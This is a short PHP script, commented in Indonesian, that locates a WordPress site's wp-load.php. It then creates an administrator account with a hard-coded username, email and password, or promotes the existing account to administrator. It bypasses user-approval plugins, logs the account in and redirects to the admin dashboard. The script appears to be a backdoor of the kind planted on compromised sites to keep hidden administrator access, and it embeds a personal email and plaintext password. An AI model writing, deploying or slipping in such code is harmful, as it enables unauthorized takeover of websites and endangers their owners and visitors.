<?php
$wp_load_path = '';
$dir = __DIR__;

for ($i = 0; $i < 6; $i++) {
    if (file_exists($dir . '/wp-load.php')) {
        $wp_load_path = $dir . '/wp-load.php';
        break;
    }
    $dir = dirname($dir);
}

if (!$wp_load_path && file_exists($_SERVER['DOCUMENT_ROOT'] . '/wp-load.php')) {
    $wp_load_path = $_SERVER['DOCUMENT_ROOT'] . '/wp-load.php';
}

if (!$wp_load_path) {
    exit("Error: Gagal menemukan file wp-load.php.");
}

require_once($wp_load_path);

$username = 'rolan';
$email    = 'hersonwaku711@gmail.com';
$password = 'kmzwa8awaa1@A';

$user = get_user_by('login', $username);

if (!$user) {
    $user_id = wp_insert_user([
        'user_login' => $username,
        'user_pass'  => $password,
        'user_email' => $email,
        'role'       => 'administrator'
    ]);

    if (is_wp_error($user_id)) {
        exit("Error: " . $user_id->get_error_message());
    }
    $user = get_userdata($user_id);
} else {
    $user->set_role('administrator');
}

// Paksa aktifkan user jika menggunakan plugin approval (seperti New User Approve / WP Approve User)
update_user_meta($user->ID, 'pw_user_status', 'approved'); // Untuk plugin New User Approve
update_user_meta($user->ID, 'wp_approve_user_status', 'approved'); // Untuk plugin WP Approve User

wp_set_current_user($user->ID, $username);
wp_set_auth_cookie($user->ID, true);
do_action('wp_login', $username, $user);

wp_safe_redirect(admin_url());
exit;
